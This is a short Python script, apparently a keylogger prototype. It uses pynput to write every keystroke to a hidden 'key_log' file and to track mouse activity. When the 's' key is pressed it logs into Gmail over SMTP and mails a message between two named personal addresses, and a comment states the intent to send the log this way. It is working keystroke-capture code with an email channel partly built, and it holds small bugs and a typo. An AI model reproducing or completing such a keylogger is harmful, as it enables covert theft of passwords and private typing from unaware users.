'''
    Desciption: Initialization for phase coding
    Author: PTH
    Version: v1.0.0
'''
'''-------------------Import Package------------------'''
# Lib to get password email from user
import getpass as gp
# Lib to create 1 listener from user
from pynput.mouse    import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
# Lib to send email using protocol SMTP with Email Dev
import smtplib, ssl
# Lib to logging to file
import logging
'''
# Using when you want to control mouse or keyboard to create automation tools
from pynput.mouse    import Controller as MouseController
from pynput.ketboard import Controller as KeyboardController
'''
''' 
#Import if want to use logging.info to log to file
import logging
logging.basicConfig(filename=("mouse_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
'''
'''-------------------Initialization Variable--------------'''
#--------------------Initialization key---------------------#
Num_key = 0
# Exp to use to log and send to email
#--------------------Logging to file---------------------#
logging.basicConfig(filename=("key_log"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    global Num_key
    Num_key += 1
    logging.info("Infomation: {0}".format(str(key)))
    if str(key) == '\'e\'':
        return False
    if str(key) == '\'s\'':
        port = 465 # Using SSL
        # port = 587 # Using TTL
        # Create a secure SSL context
        context = ssl.create_default_context()
        message = """\
        Subject: Hi there
        
        This message is sent from Python."""
        # Sender and Reciever
        sender_email = "phanthanhhung230594@gmail.com"
        receiver_email = "haclongtd1994@gmail.com"
        password = gp.getpass()
        password = password[Num_key:]
        print("Email sender: ", sender_email)
        print("Passsword typed: *** and number of string: {0}".format(len(password)))
        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)

def on_move(x, y):
    print("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    print('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

with MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
	with KeyboardListener(on_press=on_press) as listener:
		listener.join()